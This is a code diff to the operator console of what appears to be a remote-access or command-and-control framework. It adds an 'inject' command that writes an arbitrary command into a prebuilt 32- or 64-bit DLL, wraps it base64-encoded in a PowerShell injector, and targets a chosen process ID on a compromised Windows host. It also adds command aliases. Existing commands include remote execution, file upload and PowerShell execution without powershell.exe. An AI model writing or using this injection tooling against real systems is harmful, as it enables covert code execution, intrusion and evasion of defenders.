@@ -31,12 +31,16 @@ class Cli:
         self.shell_cmds["exec"] = self.exec_code
         self.shell_cmds["ps"] = self.ps
         self.shell_cmds["powerless"] = self.powerless
+        self.shell_cmds["inject"] = self.inject
+        self.shell_cmds["alias"] = self.set_alias
 
         self.config = config
         self.db = self.config.get("redis")
 
         self._prompt = "Main"
         self.guid = ""
+
+        self.alias = Alias()
 
     def set_prompt(self, prompt):
         self._prompt = prompt
@@ -193,10 +197,13 @@ class Cli:
         print "\tupload        args (path/url, path)     Upload a file on the remote system"
         print "\tps                                      List processes"
         print "\tpowerless     args (powershell)         Execute Powershell command without invoking Powershell"
+        print "\tinject        args (32/64, pid, command)Inject command into a target process (max length 4096)"
+        print "\talias         args (key, value)         Create an alias to avoid typing the same thing over and over"
         print "\tdelay         args (milliseconds)       Update the callback delay"
         print "\thelp                                    Show this help menu"
-        Alias.list_alias()
-
+        self.alias.list_alias()
+        self.alias.list_custom_alias()
+        
     def fetch(self, data):
         try:
             cmd, path, ps = data.split(" ", 2)
@@ -205,7 +212,7 @@ class Cli:
             return ";"
         
         data = ";"
-        path = Alias.get_alias(path)
+        path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path)
         else:
@@ -236,7 +243,7 @@ class Cli:
             return ";"
         
         data = ";"
-        path = Alias.get_alias(path)
+        path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path)
         else:
@@ -263,7 +270,7 @@ class Cli:
             return ";"
         
         data = ";"
-        path = Alias.get_alias(path)
+        path = self.alias.get_alias(path)
         if Utils.file_exists(path, False, False):
             data = Utils.load_file_unsafe(path)
         else:
@@ -291,6 +298,34 @@ class Cli:
         ps = Utils.load_powershell_script("powerless.ps1", 22)
         ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(ps_cmd))
         return ps
+
+
+    def inject(self, data):
+        archs = ["32", "64"]
+        try:
+            option, arch, pid, cmd = data.split(" ", 3)
+        except:
+            UI.error("Missing arguments")
+            return ";"
+        
+        if len(cmd) > 4096:
+            UI.error("Your command is bigger than 4096 bytes")
+            return ";"
+        
+        if not arch in archs:
+            UI.error("Invalid architecture provided (32/64)")
+            return ";"
+        
+        dll = Utils.load_file("bin/inject-%s.dll" % arch)
+        dll = dll.replace("A" * 4096, cmd + "\x00" * (4096 - len(cmd)))
+        
+        ps = Utils.load_powershell_script("injector.ps1", 1)
+        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(dll))
+        ps = Utils.update_key(ps, "PID", pid)
+        UI.success("Injecting %s" % cmd)
+        UI.success("Into %s bits process with PID %s" % (arch, pid))
+        
+        return ps
     
     def ps(self, data):
         ps = Utils.load_powershell_script("ps.ps1", 0)
@@ -304,4 +339,16 @@ class Cli:
     def refresh(self, data):
         for item in self.db.get_output(self.guid):
             print item
+        return ";"
+
+    def set_alias(self, data):
+        try:
+             cmd, key, value = data.split(" ", 2)
+        except:
+            UI.error("Missing arguments")
+            return ";"    
+        
+        self.alias.set_custom(key, value)
+        UI.success("%s is now set to %s" % (key, value))
+           
         return ";"
